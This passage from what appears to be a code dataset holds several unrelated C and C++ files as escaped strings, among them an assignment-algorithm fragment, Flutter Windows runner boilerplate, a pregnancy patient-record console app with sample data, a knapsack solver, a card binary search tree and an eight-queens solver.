LARGE;\r\n\t\tfor (uint_t j = 1; j < n; j++) {\r\n\t\t\tPRINTF(\"%d = %f %d = %f\\n\", j1, v1, j2, v2);\r\n\t\t\tconst cost_t c = cost[free_i][j] - v[j];\r\n\t\t\tif (c < v2) {\r\n\t\t\t\tif (c >= v1) {\r\n\t\t\t\t\tv2 = c;\r\n\t\t\t\t\tj2 = j;\r\n\t\t\t\t}\r\n\t\t\t\telse {\r\n\t\t\t\t\tv2 = v1;\r\n\t\t\t\t\tv1 = c;\r\n\t\t\t\t\tj2 = j1;\r\n\t\t\t\t\tj1 = j;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\ti0 = y[j1];\r\n\t\tv1_new = v[j1] - (v2 - v1);\r\n\t\tv1_lowers = v1_new < v[j1];\r\n\t\tPRINTF(\"%d %d 1=%d,%f 2=%d,%f v1'=%f(%d,%g) \\n\", free_i, i0, j1, v1, j2, v2, v1_new, v1_lowers, v[j1] - v1_new);\r\n\t\tif (rr_cnt < current * n) {\r\n\t\t\tif (v1_lowers) {\r\n\t\t\t\tv[j1] = v1_new;\r\n\t\t\t}\r\n\t\t\telse if (i0 >= 0 && j2 >= 0) {\r\n\t\t\t\tj1 = j2;\r\n\t\t\t\ti0 = y[j2];\r\n\t\t\t}\r\n\t\t\tif (i0 >= 0) {\r\n\t\t\t\tif (v1_lowers) {\r\n\t\t\t\t\tfree_rows[--current] = i0;\r\n\t\t\t\t}\r\n\t\t\t\telse {\r\n\t\t\t\t\tfree_rows[new_free_rows++] = i0;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\telse {\r\n\t\t\tPRINTF(\"rr_cnt=%d >= %d (current=%d * n=%d)\\n\", rr_cnt, current * n, current, n);\r\n\t\t\tif (i0 >= 0) {\r\n\t\t\t\tfree_rows[new_free_rows++] = i0;\r\n\t\t\t}\r\n\t\t}\r\n\t\tx[free_i] = j1;\r\n\t\ty[j1] = free_i;\r\n\t}\r\n\treturn new_free_rows;\r\n}\r\n\r\n\r\n/** Find columns with minimum d[j] and put them on the SCAN list.\r\n */\r\nuint_t _find_dense(const uint_t n, uint_t lo, cost_t *d, int_t *cols, int_t *y)\r\n{\r\n\tuint_t hi = lo + 1;\r\n\tcost_t mind = d[cols[lo]];\r\n\tfor (uint_t k = hi; k < n; k++) {\r\n\t\tint_t j = cols[k];\r\n\t\tif (d[j] <= mind) {\r\n\t\t\tif (d[j] < mind) {\r\n\t\t\t\thi = lo;\r\n\t\t\t\tmind = d[j];\r\n\t\t\t}\r\n\t\t\tcols[k] = cols[hi];\r\n\t\t\tcols[hi++] = j;\r\n\t\t}\r\n\t}\r\n\treturn hi;\r\n}\r\n\r\n\r\n// Scan all columns in TODO starting from arbitrary column in SCAN\r\n// and try to decrease d of the TODO columns using the SCAN column.\r\nint_t _scan_dense(const uint_t n, cost_t *cost[],\r\n\tuint_t *plo, uint_t*phi,\r\n\tcost_t *d, int_t *cols, int_t *pred,\r\n\tint_t *y, cost_t *v)\r\n{\r\n\tuint_t lo = *plo;\r\n\tuint_t hi = *phi;\r\n\tcost_t h, cred_ij;\r\n\r\n\twhile (lo != hi) {\r\n\t\tint_t j = cols[lo++];\r\n\t\tconst int_t i = y[j];\r\n\t\tconst cost_t mind = d[j];\r\n\t\th = cost[i][j] - v[j] - mind;\r\n\t\tPRINTF(\"i=%d j=%d h=%f\\n\", i, j, h);\r\n\t\t// For all columns in TODO\r\n\t\tfor (uint_t k = hi; k < n; k++) {\r\n\t\t\tj = cols[k];\r\n\t\t\tcred_ij = cost[i][j] - v[j] - h;\r\n\t\t\tif (cred_ij < d[j]) {\r\n\t\t\t\td[j] = cred_ij;\r\n\t\t\t\tpred[j] = i;\r\n\t\t\t\tif (cred_ij == mind) {\r\n\t\t\t\t\tif (y[j] < 0) {\r\n\t\t\t\t\t\treturn j;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tcols[k] = cols[hi];\r\n\t\t\t\t\tcols[hi++] = j;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t*plo = lo;\r\n\t*phi = hi;\r\n\treturn -1;\r\n}\r\n\r\n\r\n/** Single iteration of modified Dijkstra shortest path algorithm as explained in the JV paper.\r\n *\r\n * This is a dense matrix version.\r\n *\r\n * \\return The closest free column index.\r\n */\r\nint_t find_path_dense(\r\n\tconst uint_t n, cost_t *cost[],\r\n\tconst int_t start_i,\r\n\tint_t *y, cost_t *v,\r\n\tint_t *pred)\r\n{\r\n\tuint_t lo = 0, hi = 0;\r\n\tint_t final_j = -1;\r\n\tuint_t n_ready = 0;\r\n\tint_t *cols;\r\n\tcost_t *d;\r\n\r\n\tNEW(cols, int_t, n);\r\n\tNEW(d, cost_t, n);\r\n\r\n\tfor (uint_t i = 0; i < n; i++) {\r\n\t\tcols[i] = i;\r\n\t\tpred[i] = start_i;\r\n\t\td[i] = cost[start_i][i]",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_infinite_list_bloc\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\nusing namespace std;\n\nstruct DietPlan \n{\n    std::string description;\n};\n\n\nstruct ExercisePlan \n{\n    std::string description;\n};\n\nstruct Doctor \n{\n    std::string name;\n    std::string contactNumber;\n};\n\nstruct Patient \n{\n    std::string name;\n    std::string enrollmentDate;\n    std::string contactNumber;\n    std::string disease;\n    std::string pregnancyWeeks;\n    std::string height;\n    std::string weight;\n    Doctor attendingDoctor;\n};\n\nstruct EmergencyContacts\n{\n\tstd::string name;\n\tstd::string contactNumber;\n};\n\nvoid displayDoctors(const std::vector<Doctor>& doctors);\nvoid bookAppointment(const Doctor& doctor);\nvoid viewPatientInfo(const std::vector<Patient>& patients);\nvoid viewPatientInfoIndex(const std::vector<Patient>& patients, int patientChoice);\nvoid viewDietPlanForPregnancy();\nvoid displayEmergencyContacts(const std::vector<EmergencyContacts>& contacts);\n\nint main() \n{\n    std::vector<Doctor> nearbyDoctors;\n    nearbyDoctors.push_back({\"Dr. Khurana\", \"789-222-3333\"});\n    nearbyDoctors.push_back({\"Dr. Arora\", \"987-333-4444\"});\n    nearbyDoctors.push_back({\"Dr. Sharma\", \"986-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Menon\", \"777-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Rudra\", \"897-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Sneha\", \"888-444-5555\"});\n\n\n    std::vector<Patient> patients;\n    patients.push_back({\"Ishi Dikshit\", \"20-August-2023\", \"123-456-7890\", \"Thyroid\", \"8\", \"5.2\", \"160\", \"55\", {\"Dr. Khurana\", \"789-222-3333\"}});\n    patients.push_back({\"Rakshita Rudra\",\"22-April-2023\", \"987-654-3210\",\"N/A\", \"5\", \"165\", \"62\",{\"Dr. Sneha\", \"888-444-5555\"} });\n    patients.push_back({\"Anamika Mishra\",\"20-February-2023\", \"555-123-4567\",\"PCOD\",\"9\", \"155\", \"70\",{\"Dr. Sharma\", \"986-444-5555\"}});\n    patients.push_back({\"Diya Roy\", \"01-April-2023\", \"789-123-4567\",\"Diabetes\", \"4\", \"162\", \"68\",{\"Dr. Rudra\", \"897-444-5555\"}});\n    patients.push_back({\"Priya Sharma\",\"22-july-2023\", \"987-654-3210\",\"N/A\", \"7\", \"163\", \"60\",{\"Dr. Arora\", \"987-333-4444\"}});\n    patients.push_back({\"Himanshi Patel\",\"07-june-2023\", \"555-777-8888\",\"Hypertension\", \"2\", \"157\", \"65\",{\"Dr. Khurana\", \"789-222-3333\"} });\n    patients.push_back({\"Sneha Gupta\",\"21-August-2023\", \"123-987-6543\",\"Lactose intolrance\", \"5\", \"168\", \"58\",{\"Dr. Menon\", \"777-444-5555\"} });\n    patients.push_back({\"Sunena Singh\",\"20-january-2023\", \"777-555-9999\", \"N/A\", \"4\", \"170\", \"70\",{\"Dr. Khurana\", \"789-222-3333\"} });\n    patients.push_back({\"Anita Verma\",\"16-March-2023\", \"222-333-4444\", \"Hyperthyroid\", \"8\", \"155\", \"75\",{\"Dr. Arora\", \"987-333-4444\"} });\n    patients.push_back({\"Maithili Mehta\",\"16-March-2023\", \"444-555-6666\",\"N/A\", \"7\", \"161\", \"63\",{\"Dr. Rudra\", \"897-444-5555\"} });\n    patients.push_back({\"Pooja Malhotra\",\"18-September-2023\", \"555-444-3333\",\"Allergic to Root and tubers\", \"N/A\", \"166\", \"58\", {\"Dr. Menon\", \"777-444-5555\"}});\n    patients.push_back({\"Mitali Sharma\",\"29-September-2023\",\"123-987-6543\",\"N/A\", \"3\", \"159\", \"62\", {\"Dr. Rudra\", \"897-444-5555\"}});\n\n    std::vector<EmergencyContacts> contacts;\n    contacts.push_back({\"Apollo Hospitals\",\"1066\"});\n    contacts.push_back({\"Fortis Healthcare\",\"105010\"});\n    contacts.push_back({\"Emergency Ambulance Services\",\"108\"});\n    \n    \n    int choice;\n    int patientChoice;\n\n    do {\n        std::cout <<endl<< \"1. View patient information\\n\";\n        std::cout << \"2. View diet plan for pregnancy\\n\";\n        std::cout << \"3. View exercise plan\\n\";\n        std::cout << \"4. View nearby doctors\\n\";\n        std::cout << \"5. Book an appointment\\n\";\n        std::cout << \"6. View emergency contact numbers\\n\";\n        std::cout << \"7. Exit\\n\";\n        std::cout << \"Enter your choice: \";\n        std::cin >> choice;\n\n        switch (choice) \n\t\t{\n            case 1:\n                viewPatientInfo(patients);\n                break;\n            case 2:\n                viewDietPlanForPregnancy();\n                break;\n            case 3:\n               std::cout <<endl<< \"Your exercise plan for pregnant women: ...\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day 1: Gentle Cardio and Balance:\\n\";\n               std::cout << \"       - Morning: 20 minutes of prenatal walking or stationary cycling at a moderate pace\\n\";\n               std::cout << \"       - Afternoon: Balance exercises (standing on one leg, wall-supported squats) for 15 minutes\\n\";\n               std::cout << \"       - Evening: Prenatal yoga for relaxation and balance (15-20 minutes)\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day 2: Rest and Relaxation:\\n\";\n               std::cout << \"       - Focus on rest, relaxation, and deep breathing exercises\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n\nvoid readData(size_t *number_of_rocks, size_t *max_weight, std::vector<size_t> *rocks) {\n    std::cin >> (*number_of_rocks) >> (*max_weight);\n    rocks->resize(*number_of_rocks);\n    for (size_t i = 0; i < (*number_of_rocks); ++i) {\n        std::cin >> (*rocks)[i];\n    }\n}\n\nvoid printRocksSequenceUnderMaxWeight(size_t max_weight, const std::vector<size_t> &rocks) {\n    // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0434\u0432\u0443\u043c\u0435\u0440\u043d\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430.\n    // \u041f\u043e \u0433\u043e\u0440\u0438\u0437\u043e\u043d\u0442\u0430\u043b\u0438 - \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u044b\u0439 \u0432\u0435\u0441.\n    // \u041f\u043e \u0432\u0435\u0440\u0442\u0438\u043a\u0430\u043b\u0438 - \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043a\u0430\u043c\u043d\u0435\u0439, \u0431\u0435\u0440\u0443\u0449\u0438\u0445\u0441\u044f \u0434\u043b\u044f \u0437\u0430\u0434\u0430\u0447\u0438 (\u043e\u0442 \u043c\u0435\u043d\u044c\u0448\u0435\u0433\u043e \u0432\u0435\u0441\u0430 \u043a \u0431\u043e\u043b\u044c\u0448\u0435\u043c\u0443).\n    std::vector<std::vector<size_t>> subtasks(rocks.size() + 1);\n    for (size_t i = 0; i <= rocks.size(); ++i) {\n        subtasks[i].resize(max_weight + 1);\n    }\n    for (size_t i = 0; i <= rocks.size(); ++i) {\n        subtasks[i][0] = 0;\n    }\n    for (size_t i = 0; i <= max_weight; ++i) {\n        subtasks[0][i] = 0;\n    }\n\n    // \u0417\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043c\u0430\u0441\u0441\u0438\u0432\u0430.\n    for (size_t i = 1; i <= rocks.size(); ++i) {\n        for (size_t j = 1; j <= max_weight; ++j) {\n            if (j < rocks[i - 1]) {\n                subtasks[i][j] = subtasks[i - 1][j];\n            } else {\n                subtasks[i][j] =\n                    std::max(subtasks[i - 1][j], subtasks[i - 1][j - rocks[i - 1]] + rocks[i - 1]);\n            }\n        }\n    }\n    std::cout << subtasks[rocks.size()][max_weight] << \"\\n\";\n\n    // \u041e\u0431\u0440\u0430\u0442\u043d\u044b\u0439 \u043f\u0443\u0442\u044c.\n    int rock_i = rocks.size();\n    int weight_i = max_weight;\n    std::vector<int> result_rocks;\n    while (subtasks[rock_i][weight_i] != 0) {\n        while (subtasks[rock_i][weight_i] == subtasks[rock_i - 1][weight_i]) {\n            --rock_i;\n        }\n        --rock_i;\n        result_rocks.push_back(rocks[rock_i]);\n        weight_i -= rocks[rock_i];\n    }\n    std::reverse(result_rocks.begin(), result_rocks.end());\n    std::cout << result_rocks.size() << \"\\n\";\n    for (size_t i = 0; i < result_rocks.size(); ++i) {\n        std::cout << result_rocks[i] << \" \";\n    }\n}\n\nint main() {\n    size_t number_of_rocks, max_weight;\n    std::vector<size_t> rocks;\n    readData(&number_of_rocks, &max_weight, &rocks);\n    printRocksSequenceUnderMaxWeight(max_weight, rocks);\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// utility.cpp\r\n// Author: Margaux Blondel\r\n\r\n#include <string>\r\n#include <iostream>\r\n\r\n#include \"cards.h\"\r\n#include \"utility.h\"\r\n\r\nusing namespace std;\r\n\r\n// create a card with information provided by a string\r\nCard getCard(string st){\r\n    string d(\" \");                                  // delimiter between the characters\r\n    string charater_st = st.substr(0, st.find(d));  // extract character\r\n    string number = st.substr(st.find(d)+1);        // extract number\r\n    char character = charater_st[0] ;\r\n    return Card(character, number);\r\n}\r\n\r\n// helper to print Card\r\n// mostly define in lecture\r\nostream& operator<<(ostream& out, Card x){\r\n    x.print();\r\n    return out;\r\n}\r\n\r\n// constructor sets up empty tree\r\nCardsBST::CardsBST() { \r\n    root = nullptr;\r\n}\r\n\r\n// destructor deletes all nodes\r\nCardsBST::~CardsBST() {\r\n    clear(root);\r\n    root = nullptr;\r\n}\r\n\r\n// recursive helper for destructor\r\nvoid CardsBST::clear(Node *n) {\r\n    if (!n){return;}\r\n\r\n    clear(n->left);\r\n    clear(n->right);\r\n    delete n;\r\n}\r\n\r\n// insert value in tree; return false if duplicate\r\nbool CardsBST::insert(Card value) {\r\n    if (!root){\r\n        root = new Node(value);\r\n        return true;\r\n    }\r\n    bool notDuplicate = insert(value, root);\r\n    return notDuplicate ;\r\n}\r\n\r\n// recursive helper for insert (assumes n is never 0)\r\nbool CardsBST::insert(Card value, Node *n) {\r\n    // egal value\r\n    if (n->info == value){\r\n        return false;\r\n    }\r\n\r\n    // value inferior\r\n    else if (n->info > value){\r\n        if (n->left) {\r\n            return insert(value, n->left);\r\n        }\r\n        else{\r\n            n->left = new Node(value);\r\n            n->left->parent = n;\r\n            return true;\r\n        }\r\n    }\r\n\r\n    // value superior\r\n    else{\r\n        if (n->right) {\r\n            return insert(value, n->right);\r\n        }\r\n        else{\r\n            n->right= new Node(value);\r\n            n->right->parent = n;\r\n            return true;\r\n        }\r\n    }\r\n}\r\n\r\n// print tree data pre-order\r\nvoid CardsBST::printPreOrder() const {\r\n    printPreOrder(root);\r\n}\r\n\r\n// recursive helper for printPreOrder()\r\nvoid CardsBST::printPreOrder(Node *n) const {\r\n    if (!n) {return;}\r\n    cout << n->info << \" \";\r\n    printPreOrder(n->left);\r\n    printPreOrder(n->right);\r\n}\r\n\r\n// print tree data in-order\r\nvoid CardsBST::printInOrder() const {\r\n    printInOrder(root);\r\n}\r\n\r\n// recursive helper for printInOrder()\r\nvoid CardsBST::printInOrder(Node *n) const {\r\n    if (!n) {return;}\r\n    printInOrder(n->left);\r\n    cout << n->info << \" \";\r\n    printInOrder(n->right);\r\n}\r\n\r\n// prints tree data post-order\r\nvoid CardsBST::printPostOrder() const {\r\n    printPostOrder(root);\r\n}\r\n\r\n// recursive helper for printPostOrder()\r\nvoid CardsBST::printPostOrder(Node *n) const {\r\n    if (!n) {return;}\r\n    printPostOrder(n->left);\r\n    printPostOrder(n->right);\r\n    cout << n->info << \" \";\r\n}\r\n\r\n// return count of values\r\nint CardsBST::count() const {\r\n    return count(root);\r\n}\r\n\r\n// recursive helper for count\r\nint CardsBST::count(Node *n) const {\r\n    if (!n) {return 0;}\r\n    return 1 + count(n->left) + count(n->right);\r\n}\r\n\r\n// search a Node and return its reference\r\nCardsBST::Node* CardsBST::getNodeFor(Card value, Node* n) const{\r\n    if (!n) {return nullptr;}\r\n    \r\n    // egal value\r\n    if (n->info == value){\r\n        return n;\r\n    }\r\n    // value inferior\r\n    else if (n->info > value){\r\n        return getNodeFor(value, n->left);\r\n    }\r\n    // value superior\r\n    else{\r\n        return getNodeFor(value, n->right);\r\n    }\r\n}\r\n\r\n// returns true if value is in the tree; false if not\r\nbool CardsBST::contains(Card value) const {\r\n    return getNodeFor(value, root);\r\n}\r\n\r\n// returns the Node containing the predecessor of the given value\r\nCardsBST::Node* CardsBST::getPredecessorNode(Card value) const{\r\n    Node* n = root;\r\n    Node* pre = nullptr;\r\n    \r\n    while(n){\r\n        if (n->info < value){\r\n            pre = n;\r\n            n = n->right;\r\n        }\r\n        else {\r\n            n = n->left;\r\n        }\r\n    }\r\n\r\n    return pre;\r\n}\r\n\r\n// returns the predecessor value of the given value or 0 if there is none\r\nCard CardsBST::getPredecessor(Card value) const{\r\n    Node* n = getPredecessorNode(value);\r\n    if (!n){\r\n        return Card('0',\"0\");\r\n    } else {\r\n        return n->info;\r\n    }\r\n}\r\n\r\n// returns the Node containing the successor of the given value\r\nCardsBST::Node* CardsBST::getSuccessorNode(Card value) const{\r\n    Node* n = root;\r\n    Node* suc = nullptr;\r\n    \r\n    while(n){\r\n        if (n->info > value){\r\n            suc = n;\r\n            n = n->left;\r\n        }\r\n        else {\r\n            n = n->right;\r\n        }\r\n    }\r\n\r\n    return suc;\r\n}\r\n\r\n// returns the successor value of the given value or 0 if there is none\r\nCard CardsBST::getSuccessor(Card value) const{\r\n    Node* n = getSuccessorNode(value);\r\n    if (!n){\r\n        return Card('0',\"0\");\r\n    } else {\r\n        return n->info;\r\n    }\r\n}\r\n\r\n// deletes the Node containing the given ",
    "#include <iostream>\n\nusing namespace std;\n\nbool findQueenSpot(int[8][8], int, int, int);\nvoid print2DArray(int[8][8]);\n\nint main()\n{\n    int firstQueenRow = 0;\n    int firstQueenColumn = 0;\n\n    int chessBoardArray[8][8] = {0};\n\n    //Taking first queen input\n    cout << \"Enter initial coordinates of the first queen: \";\n    \n    //get two int inputs\n    cin >> firstQueenRow;\n    cin >> firstQueenColumn;\n\n    cout << firstQueenRow << \" \" << firstQueenColumn << endl << endl;\n\n    firstQueenRow--;\n    firstQueenColumn--;\n \n    chessBoardArray[firstQueenRow][firstQueenColumn] = 1;   //set first queen pos in array\n\n    //Recursive calls\n    findQueenSpot(chessBoardArray, 0, 0, firstQueenRow); //start at [0,0]\n\n    return 0;\n}\n\nbool findQueenSpot(int arr[8][8], int row, int col, int userQueen)\n{\n    if (row == userQueen)   //if current row is the user placed queen, go next row\n    {\n        if (row == 7)   //if the user queen row is the last row, prevented printing multiple times.\n        {\n            print2DArray(arr);\n            return 1;\n        }\n        findQueenSpot(arr, row+1, 0, userQueen);  //next row call\n    }\n\n    if (row >= 8)    //if the row passed is >= 8, that means all rows were filled with queen, therefore can print and return \n    {\n        print2DArray(arr);\n        return 1;\n    }\n\n    columnCheck:\n    //check if there is already a queen in the column\n    int colCheckInt = 0;\n    while (colCheckInt < 8)\n    {\n        if (col >= 8)   //if theres no where to place, failed. \n        {\n            return 0;  \n        }\n        